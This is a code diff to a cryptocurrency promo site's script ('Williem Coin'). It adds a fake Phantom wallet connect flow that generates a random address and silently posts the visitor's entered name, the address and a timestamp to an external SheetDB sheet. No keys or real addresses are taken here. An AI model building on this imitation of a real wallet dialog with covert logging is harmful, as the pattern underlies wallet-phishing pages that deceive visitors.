@@ -1,14 +1,20 @@
 /* =========================================
    WILLIEM COIN — INTERACTIVE WEBSITE
-   WALLET DEMO VERSION
+   WALLET DEMO VERSION + SHEETDB
 ========================================= */
 
 document.addEventListener('DOMContentLoaded', () => {
 
 /* =========================
+   SHEETDB URL - JANGAN LUPA GANTI
+========================= */
+const SHEETDB_URL = "https://sheetdb.io/api/v1/f3a2bec341bva"; // <-- INI URL KAMU
+
+/* =========================
    GLOBAL STATE
 ========================= */
 let walletConnected = false;
+let fakeAddress = ""; // tambahin ini buat nyimpen alamat
 
 /* =========================
    BUY BUTTON
@@ -183,7 +189,7 @@ window.closePhantomModal = function() {
     if (phantomModal) phantomModal.classList.remove("show");
 }
 
-/* FAKE PHANTOM CONNECT - UDAH BISA AMBIL NAMA */
+/* FAKE PHANTOM CONNECT - UDAH BISA AMBIL NAMA + KIRIM KE SHEET */
 window.doPhantomConnect = function() {
     const btn = document.getElementById("phantomConnectBtn");
     const address = document.getElementById("phantomAddress");
@@ -201,15 +207,36 @@ window.doPhantomConnect = function() {
 
     btn.textContent = "Connecting...";
     btn.disabled = true;
+    
+    fakeAddress = randomFakeAddress(); // simpen alamatnya dulu
+    
     setTimeout(() => {
         walletConnected = true;
-        if (address) address.textContent = randomFakeAddress();
+        if (address) address.textContent = fakeAddress;
         if (nameDisplay) nameDisplay.textContent = demoWalletName; // tampilin nama
         stepConnect.classList.add("hidden");
         stepConnected.classList.remove("hidden");
         btn.textContent = "Connect";
         btn.disabled = false;
         updateWalletButton();
+
+        // INI BAGIAN BARU: KIRIM KE GOOGLE SHEET
+        fetch(SHEETDB_URL, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({
+                data: [{
+                    "Waktu": new Date().toLocaleString("id-ID"),
+                    "Nama": demoWalletName,
+                    "Wallet": fakeAddress
+                }]
+            })
+        }).then(res => {
+            console.log("Data berhasil masuk ke Sheet!", res);
+        }).catch(err => {
+            console.error("Gagal kirim:", err);
+        });
+
     }, 1200);
 }
 
